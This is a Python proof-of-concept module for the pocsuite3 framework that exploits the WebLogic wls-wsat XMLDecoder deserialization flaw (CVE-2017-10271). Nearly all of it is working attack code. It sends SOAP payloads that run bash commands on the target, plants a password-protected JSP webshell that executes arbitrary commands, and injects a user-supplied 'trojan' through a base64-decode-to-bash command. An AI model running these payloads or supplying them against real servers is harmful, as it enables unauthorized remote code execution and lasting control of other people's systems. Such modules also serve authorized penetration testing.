import re
import base64
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, OptString, OptBool


class WlsPOC(POCBase):
    vulID = '00001'  # ssvid
    version = '1.0'
    author = ['jstang']
    vulDate = '2017-10-23'
    createDate = '2021-01-08'
    updateDate = '2021-01-08'
    references = ['']
    name = "Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞"
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'Weblogic'
    appVersion = '<=12.2.1.2'  # test_version=10.3.6
    vulType = 'RCE'
    desc = "Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。"
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    cnnvd = "CNNVD-201710-829"
    cveID = "CVE-2017-10271"
    rank = "fatal"  # [low nomal warning danger fatal]
    defaultPorts = ["7001"]
    defaultService = ["Oracle WebLogic Server (Servlet 2.5; JSP 2.1)", "weblogic"]

    def _options(self):
        o = OrderedDict()
        o["schema"] = OptString('', description='需要输入协议', require=True)
        o["command"] = OptString('', description='需要输入木马Agent', require=False)
        o["expolit"] = OptBool('', description='是否需要漏洞利用', require=False)
        return o

    def setattr(self) -> dict:
        self.uri = "/wls-wsat/CoordinatorPortType?wsdl"
        self.default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
            'Content-Type': 'text/xml'
        }

    def _getattr(self, site, cmd) -> dict:
        # http主体内容
        console = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0_131" class="java.beans.XMLDecoder">
            <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
            <void index="0">
            <string>/bin/bash</string>
            </void>
            <void index="1">
            <string>-c</string>
            </void>
            <void index="2">
            <string>touch xxx2.txt</string>
            </void>
            </array>
            <void method="start"/></void>
            </java>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body/>
            </soapenv:Envelope>'''
        vulcheck = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
            <java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1000011.txt</string>
            <void method="println">
            <string>Weblogic Vulnerability Test!</string>
            </void>
            <void method="close"/>
            </object>
            </java>
            </java>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body/>
            </soapenv:Envelope>'''
        webshell = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
            <java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.jsp</string>
            <void method="println">
            <string><![CDATA[<%
                if("023".equals(request.getParameter("pwd"))){
                java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                int a = -1;
                byte[] b = new byte[2048];
                out.print("<pre>");
                while((a=in.read(b))!=-1){
                    out.println(new String(b));
                }
                out.print("</pre>");
            }
            %>]]></string>
            </void>
            <void method="close"/>
            </object>
            </java>
            </java>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body/>
            </soapenv:Envelope>'''
        trojan = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
            <soapenv:Header>
            <wsa:Action>xx</wsa:Action>
            <wsa:RelatesTo>xx</wsa:RelatesTo>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
            <void index="0">
            <string>/bin/bash</string>
            </void>
            <void index="1">
            <string>-c</string>
            </void>
            <void index="2">
            <string>echo {} | base64 -d | bash</string>
            </void>
            </array>
            <void method="start"/></void>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
            <asy:onAsyncDelivery/>
            </soapenv:Body></soapenv:Envelope>'''
        return {
            "console": {"payload": console, "info": "<faultcode>S:Server</faultcode><faultstring>0</faultstring>"},
            "exploit": {"payload": vulcheck, "info": "{}/wls-wsat/1000011.txt".format(site)},
            "webshell": {"payload": webshell, "info": "{}/wls-wsat/test.jsp?pwd=023&i=whoami".format(site)},
            "trojan": {"payload": trojan.format(cmd), "info": "Inject Trojan"}
        }

    def _attack(self):
        print(">>>>execute _attack")
        return self._verify()

    def __exploit(self, url: str, postdata: dict) -> dict:
        # 1.Payload发送
        requests.post(url, headers=self.default_headers, timeout=5, data=postdata['payload'])
        # 2.确认返回结果
        resp = requests.get(url=postdata['info'], headers=self.default_headers)
        base64_payload = base64.b64encode(postdata['payload'].encode('utf-8')).decode('utf-8')
        if resp.status_code != 200:
            return {'URL': url, 'PostData': base64_payload, 'Result': "Exploit Failed, touch file and effect {}".format(postdata['info'])}
        return {'URL': url, 'PostData': base64_payload, 'Result': "Exploit Successfully, touch file of content=[{}] and effect {}".format(resp.text, postdata['info'])}

    def __webshell(self, url: str, postdata: dict) -> dict:
        # 1.发送payload
        requests.post(url, headers=self.default_headers, timeout=5, data=postdata['payload'])
        # 2.执行并返回
        resp = requests.get(url=postdata['info'], headers=self.default_headers)
        base64_payload = base64.b64encode(postdata['payload'].encode('utf-8')).decode('utf-8')
        if resp.status_code != 200:
            return {'URL': url, 'PostData': base64_payload, 'Result': "Exploit Failed, execute command effect webshell {}".format(postdata['info'])}
        data = "".join(re.findall("[\w</>]+", resp.text))
        return {'URL': url, 'PostData': base64_payload, 'Result': "Exploit Successfully, Get response_data=[{}] by execute command effect webshell {}".format(data, postdata['info'])}

    def __trojan_inject(self, url: str, postdata: dict) -> dict:
        # 1.发送payload
        requests.post(url, headers=self.default_headers, timeout=5, data=postdata['payload'])
        base64_payload = base64.b64encode(postdata['payload'].encode('utf-8')).decode('utf-8')
        return {'URL': url, 'PostData': base64_payload, 'Result': postdata['info'] + " Successfully"}

    # 漏洞认证
    def _verify(self):
        result = {}
        # 0. 设定类属性值
        self.setattr()

        site = self.parse_target(self.get_option("schema"), 7001)  # 非http[s]的协议的会增加默认端口, 若是http[s]协议不会增加端口
        url = site + self.uri
        print(">>>>>>", url)

        # 1. 制作postdata
        postdata = self._getattr(site, self.get_option("command"))

        # 2. 漏洞验证, <<info信息出现在返回体中>>
        resp = requests.post(url, headers=self.default_headers, timeout=5, data=postdata['console']['payload'])
        if not postdata['console']['info'] in resp.text:
            return self.parse_output(result)

        result["VerifyInfo"] = {}
        result["VerifyInfo"]["URL"] = url
        result["VerifyInfo"]["PostData"] = base64.b64encode(postdata['console']['payload'].encode('utf-8')).decode('utf-8')
        result["VerifyInfo"]["Result"] = "Find Keyinfo In Response Data, Info: " + postdata['console']['info']

        if not self.get_option("expolit"):
            print('仅进行漏洞验证.')
            return self.parse_output(result)
        # 3. 漏洞利用, <<注入文件并访问成功>>
        result["ExploitInfo"] = self.__exploit(url, postdata['exploit'])

        # 4. 漏洞利用2, <<开启WebShell并访问成功>>
        result["WebshellInfo"] = self.__webshell(url, postdata['webshell'])

        if 'Failed' in result['WebshellInfo']['Result']:
            return self.parse_output(result)

        # 5. 木马注入,
        result["TrojanInfo"] = self.__trojan_inject(url, postdata['trojan'])
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_target(self, schema: str, default_port: int) -> str:
        port_pattern = re.compile(':\d+$')
        if not port_pattern.findall(self.target) and 'http' not in schema and default_port:
            return "{}://{}:{}".format(schema, self.target, default_port)
        return "{}://{}".format(schema, self.target)


register_poc(WlsPOC)
